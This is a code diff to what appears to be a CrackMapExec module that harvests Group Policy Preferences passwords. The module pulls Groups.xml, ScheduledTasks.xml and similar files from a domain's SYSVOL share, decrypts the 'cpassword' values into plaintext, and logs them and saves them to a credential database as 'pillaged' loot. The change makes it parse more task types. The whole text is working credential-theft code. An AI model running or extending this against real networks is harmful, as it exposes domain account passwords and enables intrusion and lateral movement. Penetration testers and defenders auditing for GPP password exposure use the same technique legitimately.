@@ -36,44 +36,50 @@ class CMEModule:
                     buf = BytesIO()
                     connection.conn.getFile('SYSVOL', path, buf.write)
                     xml = ET.fromstring(buf.getvalue())
+                    sections = []
 
                     if 'Groups.xml' in path:
-                        xml_section = xml.findall("./User/Properties")
+                        sections.append('./User/Properties')
 
                     elif 'Services.xml' in path:
-                        xml_section = xml.findall('./NTService/Properties')
+                        sections.append('./NTService/Properties')
 
                     elif 'ScheduledTasks.xml' in path:
-                        xml_section = xml.findall('./Task/Properties')
+                        sections.append('./Task/Properties')
+                        sections.append('./ImmediateTask/Properties')
+                        sections.append('./ImmediateTaskV2/Properties')
+                        sections.append('./TaskV2/Properties')
 
                     elif 'DataSources.xml' in path:
-                        xml_section = xml.findall('./DataSource/Properties')
+                        sections.append('./DataSource/Properties')
 
                     elif 'Printers.xml' in path:
-                        xml_section = xml.findall('./SharedPrinter/Properties')
+                        sections.append('./SharedPrinter/Properties')
 
                     elif 'Drives.xml' in path:
-                        xml_section = xml.findall('./Drive/Properties')
+                        sections.append('./Drive/Properties')
 
-                    for attr in xml_section:
-                        props = attr.attrib
 
-                        if 'cpassword' in props:
+                    for section in sections:
+                        xml_section = xml.findall(section)
+                        for attr in xml_section:
+                            props = attr.attrib
 
-                            for user_tag in ['userName', 'accountName', 'runAs', 'username']:
-                                if user_tag in props:
-                                    username = props[user_tag]
+                            if 'cpassword' in props:
+                                for user_tag in ['userName', 'accountName', 'runAs', 'username']:
+                                    if user_tag in props:
+                                        username = props[user_tag]
 
-                            password = self.decrypt_cpassword(props['cpassword'])
+                                password = self.decrypt_cpassword(props['cpassword'])
 
-                            context.log.success('Found credentials in {}'.format(path))
-                            context.log.highlight('Password: {}'.format(password))
-                            for k,v in props.items():
-                                if k != 'cpassword':
-                                    context.log.highlight('{}: {}'.format(k, v))
+                                context.log.success('Found credentials in {}'.format(path))
+                                context.log.highlight('Password: {}'.format(password))
+                                for k,v in props.items():
+                                    if k != 'cpassword':
+                                        context.log.highlight('{}: {}'.format(k, v))
 
-                            hostid = context.db.get_computers(connection.host)[0][0]
-                            context.db.add_credential('plaintext', '', username, password, pillaged_from=hostid)
+                                hostid = context.db.get_computers(connection.host)[0][0]
+                                context.db.add_credential('plaintext', '', username, password, pillaged_from=hostid)
 
     def decrypt_cpassword(self, cpassword):
 
